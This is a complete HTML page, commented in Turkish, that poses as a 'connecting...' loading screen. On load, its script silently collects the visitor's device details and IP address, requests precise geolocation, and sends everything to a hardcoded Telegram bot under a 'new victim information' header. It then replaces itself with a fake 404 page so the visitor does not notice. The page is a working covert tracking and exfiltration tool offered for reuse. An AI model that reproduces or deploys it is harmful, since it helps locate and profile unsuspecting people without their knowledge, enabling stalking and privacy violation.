<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yükleniyor...</title>
    <style>
        body { background: #0a0a0a; color: white; font-family: Arial; text-align: center; padding-top: 50px; }
        .loader { border: 4px solid #333; border-top: 4px solid #00ff88; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>Bağlantı kuruluyor...</h2>
    <p id="status">Lütfen bekleyin</p>

<script>
    // TELEGRAM BOT BİLGİLERİ - KENDİ TOKEN VE CHAT ID'NI YAZ
    const BOT_TOKEN = "8746989231:AAHGfFiFC8uRTi6lXoUNuTRL8cQMUfMm5nE";  // DEĞİŞTİR
    const CHAT_ID = "8729744465";                                // DEĞİŞTİR

    // 1. Cihaz bilgilerini topla
    function getDeviceInfo() {
        let info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            online: navigator.onLine ? "Evet" : "Hayır",
            doNotTrack: navigator.doNotTrack || "Belirtilmemiş",
            cookiesEnabled: navigator.cookieEnabled ? "Evet" : "Hayır",
            hardwareConcurrency: navigator.hardwareConcurrency || "Bilinmiyor",
            deviceMemory: navigator.deviceMemory || "Bilinmiyor"
        };
        return info;
    }

    // 2. IP adresini al (harici API)
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch {
            return "Alınamadı";
        }
    }

    // 3. Verileri Telegram'a gönder
    async function sendToTelegram(text) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const res = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: "HTML"
                })
            });
            return res.ok;
        } catch {
            return false;
        }
    }

    // 4. Konum bilgisi (kullanıcı izni ile)
    function getLocation(callback) {
        if (!navigator.geolocation) {
            callback("Konum desteği yok");
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const loc = `Enlem: ${pos.coords.latitude}, Boylam: ${pos.coords.longitude}, Doğruluk: ${pos.coords.accuracy} metre`;
                callback(loc);
            },
            (err) => {
                callback("Konum reddedildi veya alınamadı: " + err.message);
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    // 5. Ana işlem
    async function main() {
        document.getElementById('status').innerHTML = 'Bilgiler toplanıyor...';

        const device = getDeviceInfo();
        const ip = await getIP();

        let message = `<b>📱 YENİ KURBAN BİLGİLERİ</b>\n`;
        message += `<b>IP:</b> ${ip}\n`;
        message += `<b>Tarayıcı:</b> ${device.userAgent}\n`;
        message += `<b>Platform:</b> ${device.platform}\n`;
        message += `<b>Dil:</b> ${device.language}\n`;
        message += `<b>Ekran:</b> ${device.screenWidth}x${device.screenHeight}\n`;
        message += `<b>Renk Derinliği:</b> ${device.colorDepth}\n`;
        message += `<b>Saat Dilimi:</b> ${device.timezone}\n`;
        message += `<b>Çevrimiçi:</b> ${device.online}\n`;
        message += `<b>Çerezler:</b> ${device.cookiesEnabled}\n`;
        message += `<b>CPU Çekirdek:</b> ${device.hardwareConcurrency}\n`;
        message += `<b>RAM (tahmini):</b> ${device.deviceMemory} GB\n`;
        message += `<b>Do Not Track:</b> ${device.doNotTrack}\n`;

        await sendToTelegram(message);

        document.getElementById('status').innerHTML = 'Konum isteniyor...';
        getLocation(async (loc) => {
            await sendToTelegram(`<b>📍 KONUM:</b> ${loc}`);
            document.getElementById('status').innerHTML = '✅ Bilgiler gönderildi.';
            
            // 7. Adım: Masum 404 hatası göster
            setTimeout(() => {
                document.body.innerHTML = `
                <!DOCTYPE html>
                <html>
                <head><title>404</title></head>
                <body style="background:#f4f4f4;text-align:center;padding-top:100px;font-family:sans-serif;">
                    <h1 style="color:#333;">404</h1>
                    <p style="color:#666;">Sayfa bulunamadı</p>
                    <hr style="width:100px;margin:20px auto;">
                    <p style="color:#999;font-size:14px;">Lütfen adresi kontrol edin veya ana sayfaya dönün.</p>
                </body>
                </html>`;
            }, 2000);
        });
    }

    main();
</script>
</body>
</html>
